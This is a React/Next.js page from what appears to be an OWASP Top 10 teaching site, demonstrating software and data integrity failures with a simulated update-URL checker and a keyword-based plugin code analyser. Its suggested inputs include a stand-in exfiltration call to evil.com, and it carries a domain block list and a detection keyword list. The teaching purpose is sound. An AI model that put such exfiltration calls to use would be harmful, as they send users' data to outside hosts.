'use client';

import { useState } from 'react';
import Link from 'next/link';

export default function SoftwareIntegrityFailuresPage() {
  const [updateUrl, setUpdateUrl] = useState('');
  const [updateResult, setUpdateResult] = useState('');
  const [pluginCode, setPluginCode] = useState('');
  const [pluginResult, setPluginResult] = useState('');

  const handleUpdateCheck = () => {
    if (!updateUrl) {
      setUpdateResult('Please enter an update URL');
      return;
    }

    let result = '';
    const lowerUrl = updateUrl.toLowerCase();

    if (!lowerUrl.startsWith('https://') || 
        lowerUrl.includes('download.malicious.com') ||
        lowerUrl.includes('update-server.evil.org') ||
        lowerUrl.includes('fake-cdn.com') ||
        !lowerUrl.includes('example.com') && (lowerUrl.includes('bit.ly') || lowerUrl.includes('tinyurl'))) {
      
      result = `⚠️ SOFTWARE INTEGRITY FAILURE DETECTED!

Update Source: ${updateUrl}

INTEGRITY VIOLATIONS:
${!lowerUrl.startsWith('https://') ? '- Insecure HTTP connection (should be HTTPS)\n' : ''}${lowerUrl.includes('malicious') || lowerUrl.includes('evil') ? '- Suspicious domain detected\n' : ''}${lowerUrl.includes('bit.ly') || lowerUrl.includes('tinyurl') ? '- Shortened URL hides actual destination\n' : ''}
SIMULATED MALICIOUS UPDATE:
===============================
Update Package: app_update_v2.1.3.zip
Size: 15.7 MB
Hash: SHA256:abc123def456... (NOT VERIFIED!)

Package Contents:
├── app_binary.exe
├── config_update.json
├── install_script.sh
└── backdoor.dll ⚠️ MALICIOUS!

ATTACK VECTORS:
- Supply chain compromise
- Man-in-the-middle attacks
- DNS hijacking to malicious servers  
- Compromised update infrastructure
- Social engineering (fake update notifications)

POTENTIAL IMPACT:
- Complete system compromise
- Data theft and exfiltration
- Ransomware deployment
- Persistent backdoor installation
- Credential harvesting
- Network lateral movement

SECURE UPDATE REQUIREMENTS:
- Cryptographic signature verification
- HTTPS with certificate pinning
- Hash verification (SHA-256 or stronger)
- Trusted certificate authorities only
- Rollback capabilities
- Update server authentication`;

    } else {
      result = `Update source appears legitimate: ${updateUrl}

Best practices for secure updates:
- Always use HTTPS with valid certificates
- Verify cryptographic signatures
- Check file hashes before installation  
- Use official vendor channels only
- Implement automatic rollback on failure`;
    }

    setUpdateResult(result);
  };

  const handlePluginCheck = () => {
    if (!pluginCode) {
      setPluginResult('Please enter plugin/extension code');
      return;
    }

    let result = '';
    const code = pluginCode.toLowerCase();

    if (code.includes('eval(') || code.includes('settimeout') || 
        code.includes('document.write') || code.includes('innerhtml') ||
        code.includes('ajax') || code.includes('xmlhttprequest') ||
        code.includes('fetch(') || code.includes('import()')) {
      
      result = `⚠️ POTENTIALLY MALICIOUS PLUGIN/EXTENSION CODE!

Analyzed Code Snippet:
${pluginCode}

SUSPICIOUS PATTERNS DETECTED:
${code.includes('eval(') ? '- eval() usage - can execute arbitrary code\n' : ''}${code.includes('settimeout') || code.includes('setinterval') ? '- Timer functions - potential delayed execution\n' : ''}${code.includes('document.write') || code.includes('innerhtml') ? '- DOM manipulation - potential XSS vector\n' : ''}${code.includes('ajax') || code.includes('xmlhttprequest') || code.includes('fetch(') ? '- Network requests - data exfiltration risk\n' : ''}${code.includes('import()') ? '- Dynamic imports - code injection risk\n' : ''}

INTEGRITY FAILURE SCENARIOS:
1. Plugin/Extension Compromise:
   - Malicious code injected into legitimate extensions
   - Unauthorized modifications to plugin functionality
   - Supply chain attacks on plugin repositories

2. Untrusted Code Execution:
   - Plugins with excessive permissions
   - Unverified third-party extensions
   - Code injection through plugin interfaces

3. Data Integrity Risks:
   - Plugins modifying sensitive application data
   - Unauthorized access to user information
   - Privilege escalation through plugin APIs

SECURITY RECOMMENDATIONS:
- Code review and static analysis
- Plugin sandboxing and permission controls
- Digital signature verification
- Runtime monitoring and anomaly detection
- Regular security audits of installed plugins
- Principle of least privilege for plugin permissions`;

    } else {
      result = `Plugin code appears safe: No obvious suspicious patterns detected.

However, comprehensive security analysis should include:
- Full static code analysis
- Dynamic behavior monitoring  
- Permission and API usage review
- Third-party security audits
- Regular updates and patch management`;
    }

    setPluginResult(result);
  };

  return (
    <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <div className="mb-8">
        <Link href="/" className="text-blue-600 hover:text-blue-800 text-sm font-medium">
          ← Back to OWASP Top 10
        </Link>
      </div>

      <div className="mb-8">
        <h1 className="text-3xl font-bold text-gray-900 mb-4">
          A08:2021 - Software and Data Integrity Failures
        </h1>
        <div className="bg-purple-50 border border-purple-200 rounded-lg p-6 mb-6">
          <h2 className="text-lg font-semibold text-purple-900 mb-2">
            🚨 Medium Risk Vulnerability
          </h2>
          <p className="text-purple-800">
            Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. 
            This includes software updates, critical data, and CI/CD pipelines without integrity verification.
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
        <div className="bg-white border border-gray-200 rounded-lg p-6">
          <h3 className="text-xl font-semibold text-gray-900 mb-4">
            📦 Insecure Software Updates
          </h3>
          <p className="text-gray-600 mb-4">
            Test software update integrity verification:
          </p>
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Update Server URL
              </label>
              <input
                type="url"
                value={updateUrl}
                onChange={(e) => setUpdateUrl(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="https://updates.example.com/latest"
              />
            </div>
            <div className="text-xs text-gray-500">
              <p className="font-semibold">Try these suspicious URLs:</p>
              <ul className="mt-1 space-y-1">
                <li>• http://download.malicious.com/update.zip</li>
                <li>• https://update-server.evil.org/app.exe</li>
                <li>• http://bit.ly/suspicious-update</li>
                <li>• https://fake-cdn.com/software/latest</li>
              </ul>
            </div>
            <button
              onClick={handleUpdateCheck}
              className="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-md font-medium"
            >
              Download Update
            </button>
            {updateResult && (
              <div className="bg-gray-50 border border-gray-200 rounded-md p-4 mt-4">
                <pre className="text-sm text-gray-800 whitespace-pre-wrap">{updateResult}</pre>
              </div>
            )}
          </div>
        </div>

        <div className="bg-white border border-gray-200 rounded-lg p-6">
          <h3 className="text-xl font-semibold text-gray-900 mb-4">
            🔌 Plugin/Extension Security
          </h3>
          <p className="text-gray-600 mb-4">
            Analyze plugin code for integrity issues:
          </p>
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Plugin/Extension Code
              </label>
              <textarea
                value={pluginCode}
                onChange={(e) => setPluginCode(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                rows={4}
                placeholder="Enter JavaScript code or plugin snippet..."
              />
            </div>
            <div className="text-xs text-gray-500">
              <p className="font-semibold">Try suspicious code patterns:</p>
              <ul className="mt-1 space-y-1 font-mono text-xs">
                <li>• eval(userInput)</li>
                <li>• document.write(untrustedData)</li>
                <li>• fetch('https://evil.com/exfiltrate')</li>
                <li>• setTimeout(maliciousCode, 1000)</li>
              </ul>
            </div>
            <button
              onClick={handlePluginCheck}
              className="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded-md font-medium"
            >
              Analyze Plugin Code
            </button>
            {pluginResult && (
              <div className="bg-gray-50 border border-gray-200 rounded-md p-4 mt-4">
                <pre className="text-sm text-gray-800 whitespace-pre-wrap">{pluginResult}</pre>
              </div>
            )}
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        <div className="bg-white border border-gray-200 rounded-lg p-6">
          <h3 className="text-xl font-semibold text-gray-900 mb-4">
            🎯 Integrity Failure Scenarios
          </h3>
          <div className="space-y-4 text-sm text-gray-700">
            <div>
              <h4 className="font-semibold text-gray-900">1. Unsigned Software Updates</h4>
              <p>Applications that download and install updates without signature verification.</p>
            </div>
            <div>
              <h4 className="font-semibold text-gray-900">2. Insecure CI/CD Pipelines</h4>
              <p>Build and deployment processes without integrity checks or access controls.</p>
            </div>
            <div>
              <h4 className="font-semibold text-gray-900">3. Untrusted Plugins/Extensions</h4>
              <p>Third-party code executed without proper security review or sandboxing.</p>
            </div>
            <div>
              <h4 className="font-semibold text-gray-900">4. Supply Chain Attacks</h4>
              <p>Compromise of dependencies, libraries, or development tools.</p>
            </div>
            <div>
              <h4 className="font-semibold text-gray-900">5. Data Tampering</h4>
              <p>Critical data modified without detection or audit trails.</p>
            </div>
            <div>
              <h4 className="font-semibold text-gray-900">6. Auto-Update Mechanisms</h4>
              <p>Automatic updates that bypass security controls and user oversight.</p>
            </div>
            <div>
              <h4 className="font-semibold text-gray-900">7. CDN Compromise</h4>
              <p>Content delivery networks serving malicious versions of resources.</p>
            </div>
          </div>
        </div>

        <div className="bg-green-50 border border-green-200 rounded-lg p-6">
          <h3 className="text-xl font-semibold text-green-900 mb-4">
            🛡️ Integrity Protection Strategies
          </h3>
          <div className="space-y-4 text-sm text-green-800">
            <div>
              <h4 className="font-semibold text-green-900">Digital Signatures:</h4>
              <ul className="list-disc list-inside ml-4 mt-2">
                <li>Code signing certificates for all software</li>
                <li>Certificate chain validation</li>
                <li>Timestamp verification for long-term validity</li>
                <li>Revocation checking (CRL/OCSP)</li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold text-green-900">Hash Verification:</h4>
              <ul className="list-disc list-inside ml-4 mt-2">
                <li>SHA-256 or stronger hash algorithms</li>
                <li>Secure hash distribution channels</li>
                <li>Automated integrity checking</li>
                <li>Hash comparison before execution</li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold text-green-900">Secure Development:</h4>
              <ul className="list-disc list-inside ml-4 mt-2">
                <li>Secure CI/CD pipeline configuration</li>
                <li>Build environment isolation</li>
                <li>Source code integrity verification</li>
                <li>Dependency scanning and validation</li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold text-green-900">Runtime Protection:</h4>
              <ul className="list-disc list-inside ml-4 mt-2">
                <li>Application sandboxing</li>
                <li>Plugin permission controls</li>
                <li>Real-time integrity monitoring</li>
                <li>Anomaly detection systems</li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      <div className="mt-8 bg-blue-50 border border-blue-200 rounded-lg p-6">
        <h3 className="text-lg font-semibold text-blue-900 mb-2">
          🔍 WAF Limitations for Integrity Failures
        </h3>
        <p className="text-blue-800 mb-4">
          WAFs have limited capability to detect software integrity failures, but can help with some related attacks:
        </p>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
          <div>
            <h4 className="font-semibold text-blue-900">WAF Detection Capabilities:</h4>
            <ul className="text-blue-700 mt-2 space-y-1">
              <li>• Suspicious download requests</li>
              <li>• Malicious payload signatures</li>
              <li>• Abnormal update traffic patterns</li>
              <li>• Known malicious domains/IPs</li>
            </ul>
          </div>
          <div>
            <h4 className="font-semibold text-blue-900">Integrity Verification Tools:</h4>
            <ul className="text-blue-700 mt-2 space-y-1">
              <li>• Code signing tools (signtool, codesign)</li>
              <li>• Package managers with integrity checks</li>
              <li>• CI/CD security scanners</li>
              <li>• Runtime application self-protection (RASP)</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}